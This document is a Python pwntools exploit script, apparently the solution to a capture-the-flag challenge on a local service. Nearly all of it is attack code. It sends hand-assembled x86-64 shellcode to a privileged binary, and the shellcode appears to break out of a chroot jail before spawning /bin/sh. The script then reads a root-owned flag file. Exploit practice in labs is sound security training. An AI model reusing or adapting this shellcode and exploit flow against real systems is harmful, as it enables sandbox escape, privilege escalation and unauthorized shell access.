from pwn import *
import binascii
import time

### set  for  challenge ###
context(arch = 'amd64', os = 'linux')
addr = "localhost"
port = 2007
### set  for  challenge ###

###other setup
context.terminal = ['tmux', 'splitw', '-h']
p = remote(addr,port)


### shellcode
hexx = """
eb 01 1a
6a 53               
58                  
6a 2e               
66 68 2e 2e         
48 89 e7            
be c0 01 00 00      
0f 05               
b8 a1 00 00 00      
48 89 e7            
0f 05               
66 5a               
48 31 c9            
51                  
66 52               
b1 64               

b8 50 00 00 00      
48 89 e7            
51                  
0f 05               
59                  
e2 f2               
b8 3d 00 00 00      
48 31 c9            
88 4c 24 01         
48 89 e7            
0f 05               
48 31 c0            
48 83 c0 3b         
48 31 ff            
57                  
48 bf 2f 62 69 6e 2f
2f 73 68
57                  
48 8d 3c 24         
48 31 f6            
48 31 d2            
0f 05               
"""
asm = hexx.split("\n")
b = []
for a in asm:
    x = a.strip()
    b.append(x)
shellcode = ''.join(b).replace(" ","")
### shellcode

## PWN:
CHAR = ""

def command(c):
    p.sendlineafter(CHAR, c)

def grab_file():
    tag=b"ENDDDDDDDDDDD"
    command(b"echo -n \"$(<.admin_check)\""+tag)
    byt = p.recvuntil(tag, drop=True)
    with open("test", "wb") as f:
        f.write(byt)

def pwn():
    sh = binascii.unhexlify(shellcode)
    command("./.admin_check")
    p.sendafter("PRINT?", sh+b"\x1a"+b"\n")

if __name__ == "__main__":
    CHAR = ">"
    #setup directory
    command("cd bin")  
    #grab bin data
    grab_file()
    #run exploit!
    pwn()
    #grab flag!
    p.sendlineafter("糟糕!","cat /home/rooted/flag.txt")
    p.recvline()
    print(p.recvline())

